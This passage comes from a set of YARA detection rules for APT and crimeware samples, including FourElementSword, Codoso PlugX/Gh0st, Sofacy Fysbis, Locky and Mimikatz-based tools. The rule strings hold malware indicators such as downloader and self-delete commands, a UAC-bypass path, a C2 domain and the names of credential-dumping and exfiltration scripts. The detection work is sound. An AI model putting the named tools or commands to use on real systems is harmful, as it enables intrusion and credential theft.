      author = "Florian Roth"
      reference = "not set"
      date = "2016-03-26 13:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1082, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Elevate.dll" fullword ascii
      $s2 = "GetSomeF" fullword ascii
      $s3 = "GetNativeSystemInfo" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 25KB and $s1 ) or ( all of them )
} 

rule FourElementSword_fslapi_dll_gui_RID33A3 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects FourElementSword Malware"
      author = "Florian Roth"
      reference = "not set"
      date = "2016-03-26 14:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "fslapi.dll.gui" fullword wide
      $s2 = "ImmGetDefaultIMEWnd" fullword ascii
      $s3 = "RichOX" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 12KB and all of them )
} 

rule FourElementSword_PowerShell_Start_RID3457 : DEMO MAL SCRIPT T1086 T1136 {
   meta:
      description = "Detects FourElementSword Malware"
      author = "Florian Roth"
      reference = "not set"
      date = "2016-03-26 15:26:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, SCRIPT, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "start /min powershell C:\\\\ProgramData\\\\wget.exe" ascii
      $s1 = "start /min powershell C:\\\\ProgramData\\\\iuso.exe" fullword ascii
   condition: 
      1 of them
} 

rule FourElementSword_ResN32DLL_RID309E : DEMO MAL T1136 {
   meta:
      description = "Detects FourElementSword Malware"
      author = "Florian Roth"
      reference = "not set"
      date = "2016-03-26 12:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Release\\BypassUAC.pdb" ascii
      $s2 = "\\ResN32.dll" fullword wide
      $s3 = "Eupdate" fullword wide
   condition: 
      all of them
} 

rule ProjectM_DarkComet_1_RID2E9E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects ProjectM Malware"
      author = "Florian Roth"
      reference = "http://researchcenter.paloaltonetworks.com/2016/03/unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe/"
      date = "2016-03-26 11:22:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "DarkO\\_2" fullword ascii
      $a1 = "AVICAP32.DLL" fullword ascii
      $a2 = "IDispatch4" fullword ascii
      $a3 = "FLOOD/" fullword ascii
      $a4 = "T<-/HTTP://" fullword ascii
      $a5 = "infoes" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 4 of them ) or ( all of them )
} 

rule ProjectM_CrimsonDownloader_RID317E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects ProjectM Malware"
      author = "Florian Roth"
      reference = "http://researchcenter.paloaltonetworks.com/2016/03/unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe/"
      date = "2016-03-26 13:24:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "E:\\Projects\\m_project\\main\\mj shoaib" 
      $s1 = "\\obj\\x86\\Debug\\secure_scan.pdb" ascii
      $s2 = "secure_scan.exe" fullword wide
      $s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|mswall" fullword wide
      $s4 = "secure_scan|mswall" fullword wide
      $s5 = "[Microsoft-Security-Essentials]" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $x1 ) or ( all of them )
} 

rule FourElementSword_T9000_RID2F02 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects FourElementSword Malware"
      author = "Florian Roth"
      reference = "not set"
      date = "2016-03-26 11:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "D:\\WORK\\T9000\\" ascii
      $x2 = "%s\\temp\\HHHH.dat" fullword wide
      $s1 = "Elevate.dll" fullword wide
      $s2 = "ResN32.dll" fullword wide
      $s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword wide
      $s4 = "igfxtray.exe" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of ( $x* ) ) or ( all of them )
} 

rule FourElementSword_32DLL_RID2F26 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects FourElementSword Malware"
      author = "Florian Roth"
      reference = "not set"
      date = "2016-03-26 11:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%temp%\\tmp092.tmp" fullword ascii
      $s1 = "\\System32\\ctfmon.exe" fullword ascii
      $s2 = "%SystemRoot%\\System32\\" fullword ascii
      $s3 = "32.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 660KB and $x1 ) or ( all of them )
} 

rule FourElementSword_Keyainst_EXE_RID326E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects FourElementSword Malware"
      author = "Florian Roth"
      reference = "not set"
      date = "2016-03-26 14:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\ProgramData\\Keyainst.exe" fullword ascii
      $s1 = "ShellExecuteA" fullword ascii
      $s2 = "GetStartupInfoA" fullword ascii
      $s3 = "SHELL32.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 48KB and $x1 ) or ( all of them )
} 

rule FourElementSword_ElevateDLL_RID3187 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects FourElementSword Malware"
      author = "Florian Roth"
      reference = "not set"
      date = "2016-03-26 13:26:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Elevate.dll" fullword wide
      $x2 = "ResN32.dll" fullword wide
      $s1 = "Kingsoft\\Antivirus" fullword wide
      $s2 = "KasperskyLab\\protected" fullword wide
      $s3 = "Sophos" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of ( $x* ) and all of ( $s* ) ) or ( all of them )
} 

rule WindowsShell_s3_RID2CF9 : DEMO EXE FILE MAL T1021 T1136 {
   meta:
      description = "Detects simple Windows shell - file s3.exe"
      author = "Florian Roth"
      reference = "https://github.com/odzhan/shells/"
      date = "2016-03-26 10:12:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd                  - execute cmd.exe" fullword ascii
      $s2 = "\\\\.\\pipe\\%08X" fullword ascii
      $s3 = "get <remote> <local> - download file" fullword ascii
      $s4 = "[ simple remote shell for windows v3" fullword ascii
      $s5 = "REMOTE: CreateFile(\"%s\")" fullword ascii
      $s6 = "put <local> <remote> - upload file" fullword ascii
      $s7 = "term                 - terminate remote client" fullword ascii
      $s8 = "[ downloading \"%s\" to \"%s\"" fullword ascii
      $s9 = "-l           Listen for incoming connections" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them ) or ( 5 of them )
} 

rule WindosShell_s1_RID2C80 : DEMO EXE FILE MAL T1021 T1136 {
   meta:
      description = "Detects simple Windows shell - file s1.exe"
      author = "Florian Roth"
      reference = "https://github.com/odzhan/shells/"
      date = "2016-03-26 09:51:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[ executing cmd.exe" fullword ascii
      $s2 = "[ simple remote shell for windows v1" fullword ascii
      $s3 = "-p <number>  Port number to use (default is 443)" fullword ascii
      $s4 = "usage: s1 <address> [options]" fullword ascii
      $s5 = "[ waiting for connections on %s" fullword ascii
      $s6 = "-l           Listen for incoming connections" fullword ascii
      $s7 = "[ connection from %s" fullword ascii
      $s8 = "[ %c%c requires parameter" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them ) or ( 5 of them )
} 

rule WindowsShell_s4_RID2CFA : DEMO EXE FILE MAL T1021 T1136 {
   meta:
      description = "Detects simple Windows shell - file s4.exe"
      author = "Florian Roth"
      reference = "https://github.com/odzhan/shells/"
      date = "2016-03-26 10:12:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd                  - execute cmd.exe" fullword ascii
      $s2 = "\\\\.\\pipe\\%08X" fullword ascii
      $s3 = "get <remote> <local> - download file" fullword ascii
      $s4 = "[ simple remote shell for windows v4" fullword ascii
      $s5 = "REMOTE: CreateFile(\"%s\")" fullword ascii
      $s6 = "[ downloading \"%s\" to \"%s\"" fullword ascii
      $s7 = "[ uploading \"%s\" to \"%s\"" fullword ascii
      $s8 = "-l           Listen for incoming connections" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 175KB and 2 of them ) or ( 5 of them )
} 

rule WindowsShell_Gen_RID2D6D : DEMO EXE FILE GEN MAL T1021 T1136 {
   meta:
      description = "Detects simple Windows shell - from files keygen.exe, s1.exe, s2.exe, s3.exe, s4.exe"
      author = "Florian Roth"
      reference = "https://github.com/odzhan/shells/"
      date = "2016-03-26 10:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, MAL, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "[ %c%c requires parameter" fullword ascii
      $s1 = "[ %s : %i" fullword ascii
      $s2 = "[ %s : %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 175KB and 2 of them ) or ( all of them )
} 

rule WindowsShell_Gen2_RID2D9F : DEMO EXE FILE MAL T1021 T1136 {
   meta:
      description = "Detects simple Windows shell - from files s3.exe, s4.exe"
      author = "Florian Roth"
      reference = "https://github.com/odzhan/shells/"
      date = "2016-03-26 10:39:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd                  - execute cmd.exe" fullword ascii
      $s2 = "get <remote> <local> - download file" fullword ascii
      $s3 = "REMOTE: CreateFile(\"%s\")" fullword ascii
      $s4 = "put <local> <remote> - upload file" fullword ascii
      $s5 = "term                 - terminate remote client" fullword ascii
      $s6 = "[ uploading \"%s\" to \"%s\"" fullword ascii
      $s7 = "[ error : received %i bytes" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 175KB and 2 of them ) or ( 5 of them )
} 

rule Powershell_Attack_Scripts_RID3134 : DEMO HKTL T1086 T1136 {
   meta:
      description = "Powershell Attack Scripts"
      author = "Florian Roth"
      reference = "-"
      date = "2016-03-09 13:12:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "PowershellMafia\\Invoke-Shellcode.ps1" ascii
      $s2 = "Nishang\\Do-Exfiltration.ps1" ascii
      $s3 = "PowershellMafia\\Invoke-Mimikatz.ps1" ascii
      $s4 = "Inveigh\\Inveigh.ps1" ascii
   condition: 
      1 of them
} 

rule PSAttack_ZIP_RID2B5E : DEMO FILE HKTL T1086 T1136 {
   meta:
      description = "PSAttack - Powershell attack tool - file PSAttack.zip"
      author = "Florian Roth"
      reference = "https://github.com/gdssecurity/PSAttack/releases/"
      date = "2016-03-09 09:03:31"
      score = 100
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "PSAttack.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and all of them
} 

rule PSAttack_EXE_RID2B4D : DEMO EXE FILE HKTL T1086 T1136 {
   meta:
      description = "PSAttack - Powershell attack tool - file PSAttack.exe"
      author = "Florian Roth"
      reference = "https://github.com/gdssecurity/PSAttack/releases/"
      date = "2016-03-09 09:00:41"
      score = 100
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\PSAttack.pdb" fullword
      $s1 = "set-executionpolicy bypass -Scope process -Force" fullword wide
      $s2 = "PSAttack.Modules." ascii
      $s3 = "PSAttack.PSAttackProcessing" fullword ascii
      $s4 = "PSAttack.Modules.key.txt" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and ( $x1 or 2 of ( $s* ) ) ) or 3 of them
} 

rule Locky_Ransomware_RID2D91 : CRIME DEMO MAL {
   meta:
      description = "Detects Locky Ransomware (matches also on Win32/Kuluoz)"
      author = "Florian Roth"
      reference = "https://goo.gl/qScSrE"
      date = "2016-02-17 10:37:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CRIME, DEMO, MAL"
      minimum_yara = "1.7"
      
   strings:
      $o1 = { 45 b8 99 f7 f9 0f af 45 b8 89 45 b8 } 
      $o2 = { 2b 0a 0f af 4d f8 89 4d f8 c7 45 } 
   condition: 
      all of ( $o* )
} 

rule Sofacy_Fybis_ELF_Backdoor_Gen1_RID3236 : APT DEMO FILE G0007 G0019 LINUX MAL RUSSIA T1136 {
   meta:
      description = "Detects Sofacy Fysbis Linux Backdoor_Naikon_APT_Sample1"
      author = "Florian Roth"
      reference = "http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/"
      date = "2016-02-13 13:55:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0007, G0019, LINUX, MAL, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Your command not writed to pipe" fullword ascii
      $x2 = "Terminal don`t started for executing command" fullword ascii
      $x3 = "Command will have end with \\n" fullword ascii
      $s1 = "WantedBy=multi-user.target' >> /usr/lib/systemd/system/" fullword ascii
      $s2 = "Success execute command or long for waiting executing your command" fullword ascii
      $s3 = "ls /etc | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\"" fullword ascii
      $s4 = "rm -f /usr/lib/systemd/system/" fullword ascii
      $s5 = "ExecStart=" fullword ascii
      $s6 = "<table><caption><font size=4 color=red>TABLE EXECUTE FILES</font></caption>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 500KB and 1 of ( $x* ) ) or ( 1 of ( $x* ) and 3 of ( $s* ) )
} 

rule Sofacy_Fysbis_ELF_Backdoor_Gen2_RID32AA : APT DEMO FILE G0007 LINUX MAL RUSSIA T1136 {
   meta:
      description = "Detects Sofacy Fysbis Linux Backdoor"
      author = "Florian Roth"
      reference = "http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/"
      date = "2016-02-13 14:14:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0007, LINUX, MAL, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "RemoteShell" ascii
      $s2 = "basic_string::_M_replace_dispatch" fullword ascii
      $s3 = "HttpChannel" ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 500KB and all of them
} 

rule Powerkatz_DLL_Generic_RID2F2F : DEMO EXE FILE GEN HKTL S0002 T1003 T1075 T1086 T1097 T1136 T1178 {
   meta:
      description = "Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)"
      author = "Florian Roth"
      reference = "PowerKatz Analysis"
      date = "2016-02-05 11:46:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, HKTL, S0002, T1003, T1075, T1086, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%3u - Directory '%s' (*.kirbi)" fullword wide
      $s2 = "%*s  pPublicKey         : " fullword wide
      $s3 = "<3 eo.oe ~ ANSSI E>" fullword wide
      $s4 = "\\*.kirbi" fullword wide
      $c1 = "kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)" fullword wide
      $c2 = "kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them
} 

rule Codoso_PGV_PVID_3_RID2CE8 : DEMO G0073 MAL T1136 {
   meta:
      description = "Detects Codoso APT PGV PVID Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:09:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, G0073, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Copyright (C) Microsoft Corporation.  All rights reserved.(C) 2012" fullword wide
   condition: 
      $x1
} 

rule Codoso_PlugX_3_RID2C59 : DEMO EXE FILE G0073 MAL T1136 {
   meta:
      description = "Detects Codoso APT PlugX Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 09:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Cannot create folder %sDCRC failed in the encrypted file %s. Corrupt file or wrong password." fullword wide
      $s2 = "mcs.exe" fullword ascii
      $s3 = "McAltLib.dll" fullword ascii
      $s4 = "WinRAR self-extracting archive" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1200KB and all of them
} 

rule Codoso_PlugX_2_RID2C58 : DEMO EXE FILE G0073 MAL T1136 {
   meta:
      description = "Detects Codoso APT PlugX Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 09:45:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%TEMP%\\HID" fullword wide
      $s2 = "%s\\hid.dll" fullword wide
      $s3 = "%s\\SOUNDMAN.exe" fullword wide
      $s4 = "\"%s\\SOUNDMAN.exe\" %d %d" fullword wide
      $s5 = "%s\\HID.dllx" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them ) or all of them
} 

rule Codoso_CustomTCP_4_RID2DCC : DEMO EXE FILE G0073 MAL T1007 T1136 {
   meta:
      description = "Detects Codoso APT CustomTCP Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1007, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "varus_service_x86.dll" fullword ascii
      $s1 = "/s %s /p %d /st %d /rt %d" fullword ascii
      $s2 = "net start %%1" fullword ascii
      $s3 = "ping 127.1 > nul" fullword ascii
      $s4 = "McInitMISPAlertEx" fullword ascii
      $s5 = "sc start %%1" fullword ascii
      $s6 = "net stop %%1" fullword ascii
      $s7 = "WorkerRun" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 5 of them ) or ( $x1 and 2 of ( $s* ) )
} 

rule Codoso_CustomTCP_3_RID2DCB : DEMO EXE FILE G0073 MAL T1136 {
   meta:
      description = "Detects Codoso APT CustomTCP Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "DnsApi.dll" fullword ascii
      $s2 = "softWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\%s" ascii
      $s3 = "CONNECT %s:%d hTTP/1.1" ascii
      $s4 = "CONNECT %s:%d HTTp/1.1" ascii
      $s5 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0;)" ascii
      $s6 = "iphlpapi.dll" ascii
      $s7 = "%systemroot%\\Web\\" ascii
      $s8 = "Proxy-Authorization: Negotiate %s" ascii
      $s9 = "CLSID\\{%s}\\InprocServer32" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 5 of them ) or 7 of them
} 

rule Codoso_CustomTCP_2_RID2DCA : DEMO EXE FILE G0073 MAL T1007 T1136 {
   meta:
      description = "Detects Codoso APT CustomTCP Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1007, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "varus_service_x86.dll" fullword ascii
      $s2 = "/s %s /p %d /st %d /rt %d" fullword ascii
      $s3 = "net start %%1" fullword ascii
      $s4 = "ping 127.1 > nul" fullword ascii
      $s5 = "McInitMISPAlertEx" fullword ascii
      $s6 = "sc start %%1" fullword ascii
      $s7 = "B_WKNDNSK^" fullword ascii
      $s8 = "net stop %%1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 406KB and all of them
} 

rule Codoso_PGV_PVID_6_RID2CEB : DEMO EXE FILE G0073 MAL T1085 T1136 {
   meta:
      description = "Detects Codoso APT PGV_PVID Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "rundll32 \"%s\",%s" fullword ascii
      $s1 = "/c ping 127.%d & del \"%s\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them
} 

rule Codoso_Gh0st_3_RID2C2F : DEMO EXE FILE G0073 MAL T1136 {
   meta:
      description = "Detects Codoso APT Gh0st Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 09:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "RunMeByDLL32" fullword ascii
      $s1 = "svchost.dll" fullword wide
      $s2 = "server.dll" fullword ascii
      $s3 = "Copyright ? 2008" fullword wide
      $s4 = "testsupdate33" fullword ascii
      $s5 = "Device Protect Application" fullword wide
      $s6 = "MSVCP60.DLL" fullword ascii
      $s7 = "mail-news.eicp.net" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 195KB and $x1 or 4 of them
} 

rule Codoso_Gh0st_2_RID2C2E : DEMO EXE FILE G0073 MAL T1085 T1136 {
   meta:
      description = "Detects Codoso APT Gh0st Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 09:38:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s" fullword ascii
      $s1 = "rundll32.exe \"%s\", RunMeByDLL32" fullword ascii
      $s13 = "Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}" fullword wide
      $s14 = "%s -r debug 1" fullword ascii
      $s15 = "\\\\.\\keymmdrv1" fullword ascii
      $s17 = "RunMeByDLL32" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them
} 

rule Codoso_CustomTCP_RID2D39 : DEMO EXE FILE G0073 MAL T1136 {
   meta:
      description = "Codoso CustomTCP Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "wnyglw" fullword ascii
      $s5 = "WorkerRun" fullword ascii
      $s7 = "boazdcd" fullword ascii
      $s8 = "wayflw" fullword ascii
      $s9 = "CODETABL" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 405KB and all of them
} 

rule Codoso_PGV_PVID_5_RID2CEA : DEMO EXE FILE G0073 MAL T1136 {
   meta:
      description = "Detects Codoso APT PGV PVID Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/c del %s >> NUL" fullword ascii
      $s2 = "%s%s.manifest" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them
} 

rule Codoso_Gh0st_1_RID2C2D : DEMO EXE FILE G0073 MAL T1085 T1089 T1136 {
   meta:
      description = "Detects Codoso APT Gh0st Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 09:38:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0073, MAL, T1085, T1089, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s" fullword ascii
      $x2 = "rundll32.exe \"%s\", RunMeByDLL32" fullword ascii
      $x3 = "Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}" fullword wide
      $x4 = "\\\\.\\keymmdrv1" fullword ascii
      $s1 = "spideragent.exe" fullword ascii
      $s2 = "AVGIDSAgent.exe" fullword ascii
      $s3 = "kavsvc.exe" fullword ascii
      $s4 = "mspaint.exe" fullword ascii
      $s5 = "kav.exe" fullword ascii
      $s6 = "avp.exe" fullword ascii
      $s7 = "NAV.exe" fullword ascii
      $c1 = "Elevation:Administrator!new:" wide
      $c2 = "Global\\RUNDLL32EXITEVENT_NAME{12845-8654-543}" fullword ascii
      $c3 = "\\sysprep\\sysprep.exe" fullword wide
      $c4 = "\\sysprep\\CRYPTBASE.dll" fullword wide
      $c5 = "Global\\TERMINATEEVENT_NAME{12845-8654-542}" fullword ascii
      $c6 = "ConsentPromptBehaviorAdmin" fullword ascii
      $c7 = "\\sysprep" fullword wide
      $c8 = "Global\\UN{5FFC0C8B-8BE5-49d5-B9F2-BCDC8976EE10}" fullword ascii
   condition: 
